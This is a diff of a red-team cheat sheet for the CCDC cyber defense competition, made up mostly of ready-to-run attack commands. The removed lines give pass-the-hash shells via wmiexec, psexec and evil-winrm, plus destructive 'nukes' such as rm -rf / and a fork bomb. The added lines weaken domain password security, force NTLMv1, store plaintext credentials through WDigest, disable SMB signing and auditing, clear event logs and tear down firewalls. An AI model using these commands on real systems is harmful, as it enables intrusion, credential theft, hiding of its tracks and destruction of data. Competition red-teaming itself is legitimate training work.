@@ -67,14 +67,6 @@ pagetitle: Red Teaming for CCDC
     - Service: `Stop-Service -Name "WinUpdaterSvc"` and `$service = Get-WmiObject -Class Win32_Service -Filter "Name='WinUpdaterSvc'"; $service.delete()`
     - Registry UserInit: Remove 2nd path and 2nd comma from `HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
     - Registry Logon Script: Remove path from `HKCU:\Environment`
-- Shells:
-  - 135 - use `wmiexec.py -hashes :{hash} '{domain}/{user}@{ip}'`
-  - 139/445 - use `psexec.py -hashes :{hash} '{domain}/{user}@{ip}'` or `smbexec`
-  - 593 - use `atexec.py -hashes :{hash} '{domain}/{user}@{ip}' "{command}"`
-  - 3389 - user `xfreerdp3 /u:{user} /d:{domain} /pth:{hash} /v:{IP}`
-    - `/p:{password}` if we have it
-  - 5985 - use `evil-winrm -i {IP} -u '{domain}\{username}' -H {hash} -r {domain}`
-    - `-r` optional, used for kerberos
 - Persisting via the `Guest` account
   - After enabling/providing administrator to Guest and adding it to the `Remote Desktop Users` group, we might still need to configure group policy:
     - `secedit /export /cfg C:\Windows\temp\secpol.inf`
@@ -140,9 +132,20 @@ pagetitle: Red Teaming for CCDC
 
 ## Domain Persistence
 
-**Plaintext Passwords**
+**Passwords Shenanigans**
 - Allow reversible encryption for all users: `Get-ADUser -Filter { SamAccountName -notlike "*$" } | Set-ADUser -AllowReversiblePasswordEncryption $true`
-- Turn on reversible encryption policy: `Set-ADDefaultDomainPasswordPolicy -Identity {domain} -ReversibleEncryptionEnabled $true`
+- Turn on reversible encryption policy: `Set-ADDefaultDomainPasswordPolicy -Identity (Get-ADDomain).DistinguishedName -ReversibleEncryptionEnabled $true`
+- Force NTLMv1: `Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LMCompatibilityLevel" -Value 0 -Type DWord`
+- Allow old passwords for 5 days: `Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "OldPasswordAllowedPeriod" -Value 7200 -Type DWord`
+- Make password policy terrible: `Set-ADDefaultDomainPasswordPolicy -Identity (Get-ADDomain).DistinguishedName -MinPasswordLength 1 -PasswordHistoryCount 0 -ComplexityEnabled $false -MaxPasswordAge "999.00:00:00" -MinPasswordAge "0.00:00:00" -LockoutThreshold 0`
+- Store plaintext password with WDigest: `Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1 -Type DWord`
+
+**Make Services Worse**
+- Disable SMB Signing: `Set-SmbServerConfiguration -RequireSecuritySignature $false -EnableSecuritySignature $false -Force`
+
+**Logging**
+- Disable audit policies: `auditpol /set /category:* /success:disable /failure:disable`
+- Clear existing logs: `wevtutil cl Security; wevtutil cl System; wevtutil cl Application`
 
 **Skeleton Key**
 - Implants into LSASS and creates master password working for any AD account
@@ -226,28 +229,6 @@ pagetitle: Red Teaming for CCDC
 
 ## Messing with Blue Team
 
-**Killing Services**
-- Soft breaks:
-  - `systemctl stop {service}` 
-    - This is too kind, we shant do this :>
-  - Edit service configs
-  - Drop 50% of incoming firewall packets
-  - `keyboard_desktop_flipper.sh`
-  - `service_stopper.sh`
-  - `command_rotate.sh`
-- Hard breaks:
-  - Delete configs
-  - Destructive firewall rules
-  - Remove scoring assets
-  - Delete entire binaries/files
-  - `ip_rotate.sh`
-- Nukes:
-  - `rm -rf / -no-preserve-root`
-  - `del /Q /S`
-  - Fork bombing (`:(){ :|:& };:`)
-  - `timebomb.sh`
-  - Corrupt bootloader partitions
-
 **Trolling on Linux**
 - Make `apt` useless:
   - `sed -i '50i alias apt="apt -s"' /root/.bashrc; touch -d "Aug 8 2023" /root/.bashrc; sed -i '50i alias apt="apt -s"' /root/.zshrc; touch -d "Aug 8 2023" /root/.zshrc`
@@ -274,6 +255,10 @@ pagetitle: Red Teaming for CCDC
   - `1..50 | ForEach-Object {Start-Process notepad}`
 - Spawn message box on Windows:
   - `Add-Type -AssemblyName PresentationFramework;   [System.Windows.MessageBox]::Show("{message_box_message}", "{message_box_title}", 0, 64)`
+- Firewall stuff
+  - Turn off firewall: `Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False`
+  - Reset firewall to default rules: `netsh advfirewall reset`
+  - NUKE firewall (will prevent remote access): `Remove-NetFirewallRule -All` 
 
 ## Dealing with System Protections
 
